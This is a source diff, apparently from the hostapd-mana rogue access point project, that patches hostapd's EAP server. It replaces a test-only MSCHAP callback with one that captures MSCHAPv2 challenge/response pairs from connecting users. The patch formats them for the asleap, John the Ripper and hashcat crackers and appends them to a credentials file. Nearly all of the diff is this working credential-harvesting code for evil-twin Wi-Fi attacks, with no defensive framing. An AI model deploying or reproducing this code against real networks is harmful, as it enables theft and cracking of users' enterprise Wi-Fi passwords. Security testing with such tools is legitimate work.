@@ -19,6 +19,7 @@
 #include "eap_i.h"
 #include "state_machine.h"
 #include "common/wpa_ctrl.h"
+#include "common/mana.h" //MANA
 
 #define STATE_MACHINE_DATA struct eap_sm
 #define STATE_MACHINE_DEBUG_PREFIX "EAP"
@@ -2014,6 +2015,7 @@ void eap_server_clear_identity(struct eap_sm *sm)
 }
 
 
+/*
 #ifdef CONFIG_TESTING_OPTIONS
 void eap_server_mschap_rx_callback(struct eap_sm *sm, const char *source,
 				   const u8 *username, size_t username_len,
@@ -2021,7 +2023,7 @@ void eap_server_mschap_rx_callback(struct eap_sm *sm, const char *source,
 {
 	char hex_challenge[30], hex_response[90], user[100];
 
-	/* Print out Challenge and Response in format supported by asleap. */
+	// Print out Challenge and Response in format supported by asleap.
 	if (username)
 		printf_encode(user, sizeof(user), username, username_len);
 	else
@@ -2033,4 +2035,47 @@ void eap_server_mschap_rx_callback(struct eap_sm *sm, const char *source,
 	wpa_printf(MSG_DEBUG, "[%s/user=%s] asleap -C %s -R %s",
 		   source, user, hex_challenge, hex_response);
 }
-#endif /* CONFIG_TESTING_OPTIONS */
+#endif // CONFIG_TESTING_OPTIONS
+*/
+//MANA WPE Start
+void eap_server_mschap_rx_callback(struct eap_sm *sm, const char *source,
+				   const u8 *username, size_t username_len,
+				   const u8 *challenge, const u8 *response)
+{
+	if (mana.conf->mana_wpe) {
+		char hex_sep_challenge[30], hex_sep_response[90], user[100];
+		char hex_challenge[30], hex_response[90];
+
+		/* Print out Challenge and Response in format supported by asleap/jtr/hashcat. */
+		if (username)
+			printf_encode(user, sizeof(user), username, username_len);
+		else
+			user[0] = '\0';
+		wpa_snprintf_hex_sep(hex_sep_challenge, sizeof(hex_sep_challenge),
+				     challenge, sizeof(challenge), ':');
+		wpa_snprintf_hex_sep(hex_sep_response, sizeof(hex_sep_response), response, 24,
+				     ':');
+		wpa_printf(MSG_INFO, "[MANA %s ASLEAP user=%s] asleap -C %s -R %s",
+			   source, user, hex_sep_challenge, hex_sep_response);
+		wpa_snprintf_hex(hex_challenge, sizeof(hex_challenge), challenge, sizeof(challenge));
+		wpa_snprintf_hex(hex_response, sizeof(hex_response), response, 24);
+		wpa_printf(MSG_INFO, "[MANA %s JTR] %s:$NETNTLM$%s$%s:::::::",
+			   source, user, hex_challenge, hex_response);
+		wpa_printf(MSG_INFO, "[MANA %s HASHCAT] %s::::%s:%s",
+			   source, user, hex_response, hex_challenge);
+
+		if (os_strcmp("NOT_SET",mana.conf->mana_credout)!=0) {
+			FILE *f = fopen(mana.conf->mana_credout, "a");
+			if (f != NULL) {
+				fprintf(f,"[%s ASLEAP user=%s]\tasleap -C %s -R %s\n",
+					source, user, hex_sep_challenge, hex_sep_response);
+				fprintf(f,"[%s JTR]\t%s:$NETNTLM$%s$%s:::::::\n",
+					source, user, hex_challenge, hex_response);
+				fprintf(f,"[%s HASHCAT]\t%s::::%s:%s\n",
+					source, user, hex_response, hex_challenge);
+				fclose(f);
+			}
+		}
+	}
+}
+//MANA WPE END
